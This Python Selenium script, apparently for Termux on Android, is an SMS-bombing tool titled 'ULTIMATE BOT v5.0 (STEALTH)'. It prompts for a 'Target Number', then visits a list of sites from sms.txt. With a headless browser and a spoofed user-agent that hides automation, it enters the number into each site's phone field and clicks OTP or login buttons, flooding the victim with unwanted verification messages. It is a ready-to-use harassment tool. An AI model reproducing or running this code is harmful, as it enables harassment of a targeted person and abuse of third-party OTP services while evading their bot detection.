import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys

# --- CONFIG ---
SMS_FILE = "sms.txt"
CALL_FILE = "call.txt"
success, failed = 0, 0

def load_links(filename):
    if not os.path.exists(filename): return []
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip() and line.startswith("http")]

def create_driver():
    options = Options()
    options.add_argument("--headless") 
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
    
    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
    try:
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(35)
        return driver
    except: return None

def attempt_action(driver, mobile):
    try:
        # Step 1: Escape key dabao taki koi popup ho to hatt jaye
        driver.find_element(By.TAG_NAME, 'body').send_keys(Keys.ESCAPE)
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 200);")

        # Step 2: Specific XPaths for Indian Sites
        mobile_xpaths = [
            "//input[@type='tel']", 
            "//input[contains(@placeholder, 'Mobile')]",
            "//input[contains(@placeholder, 'Phone')]",
            "//input[contains(@name, 'mobile')]",
            "//input[contains(@id, 'mobile')]",
            "//input[@maxlength='10']"
        ]
        
        m_box = None
        for xpath in mobile_xpaths:
            try:
                el = driver.find_element(By.XPATH, xpath)
                if el.is_displayed():
                    m_box = el
                    break
            except: continue

        # Step 3: Agar box nahi mila, button click karo (Login/Sign-in)
        if not m_box:
            btns = driver.find_elements(By.TAG_NAME, "button")
            for b in btns:
                if any(x in b.text.lower() for x in ["login", "otp", "sign"]):
                    driver.execute_script("arguments[0].click();", b)
                    time.sleep(3)
                    break
            # Phir se box dhundo
            for xpath in mobile_xpaths:
                try: m_box = driver.find_element(By.XPATH, xpath); break
                except: continue

        if m_box:
            m_box.clear()
            m_box.send_keys(mobile)
            time.sleep(1)
            
            # Step 4: Submit Button dhundo (Smartly)
            submit_xpaths = [
                "//button[contains(text(), 'OTP')]",
                "//button[contains(text(), 'Continue')]",
                "//button[@type='submit']",
                "//input[@type='submit']",
                "//*[contains(text(), 'Proceed')]"
            ]
            for sx in submit_xpaths:
                try:
                    s_btn = driver.find_element(By.XPATH, sx)
                    driver.execute_script("arguments[0].click();", s_btn)
                    time.sleep(4)
                    return True
                except: continue
    except: pass
    return False

def attempt(site, mobile):
    global success, failed
    driver = create_driver()
    if not driver: return
    try:
        driver.get(site)
        time.sleep(6) # Wait for load
        if attempt_action(driver, mobile):
            print(f"[+] SUCCESS: {site}")
            success += 1
        else:
            print(f"[-] FAILED: {site}")
            failed += 1
    except:
        print(f"[!] TIMEOUT: {site}")
        failed += 1
    finally:
        driver.quit()

def main():
    try:
        os.system("clear")
        print("================================")
        print("   ULTIMATE BOT v5.0 (STEALTH)  ")
        print("================================\n")
        mobile = input("Enter Target Number: ")
        sms_list = load_links(SMS_FILE)
        
        print(f"\n[*] Targeting {len(sms_list)} sites...\n")
        for site in sms_list:
            attempt(site, mobile)
    except KeyboardInterrupt:
        print("\nStopped.")
    finally:
        print(f"\nDONE | OK:{success} | FAIL:{failed}")

if __name__ == "__main__":
    main()
